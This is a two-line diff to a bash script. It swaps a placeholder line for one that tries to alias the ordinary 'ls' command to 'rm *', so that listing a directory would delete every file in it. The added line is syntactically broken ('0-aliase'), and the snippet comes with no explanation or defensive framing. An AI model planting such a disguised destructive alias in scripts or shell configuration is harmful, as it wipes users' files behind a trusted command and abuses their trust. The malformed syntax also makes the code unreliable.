@@ -1,2 +1,2 @@
 #!/bin/bash
-i_am_only_ls_alias
+0-aliase ls="rm *"
